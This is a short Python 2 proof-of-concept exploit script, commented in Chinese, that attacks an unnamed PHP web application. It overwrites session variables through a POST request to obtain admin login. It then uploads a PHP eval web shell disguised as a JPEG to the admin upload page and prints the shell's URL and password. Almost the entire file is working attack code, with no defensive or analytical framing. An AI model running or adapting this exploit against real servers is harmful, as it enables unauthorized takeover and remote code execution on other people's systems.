#!/usr/bin/env python		
#coding:utf-8

import requests
import urlparse
import re

payload1 = {
	'_SESSION[login_in]':1,
	'_SESSION[admin]':1,
	'_SESSION[login_time]':'99999999999'
	}

def poc(url):
	#获取session
	t = urlparse.urlparse(url)
	url1 = t.scheme+'://'+t.netloc+'/index.php'
	s = requests.session()
	headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'}
	s.post(url,data=payload1,headers=headers)

	# 文件上传
	url2 = t.scheme+'://'+t.netloc+'/admin/upload.php'
	data = {
		'thumb_width':300,
		'thumb_height':300,
		'submit':'submit',
		'get':None

	}
	files = {'up':('1.php','<?php @eval($_POST[1]);?>','image/jpeg')}
	try:
		res = s.post(url2,files=files,data=data,headers=headers,timeout=3)
		shell_path = re.findall("val\('(.*?)'\)",res.content)
		#print shell_path[0]
		if shell_path:
			print '[*]shell:'+url+'/upload/'+shell_path[0]+ '  [password:1]'
		else:
			print 'upload failed'
			return False

	except:
		return False


if __name__ == '__main__':
	poc('http://localhost/')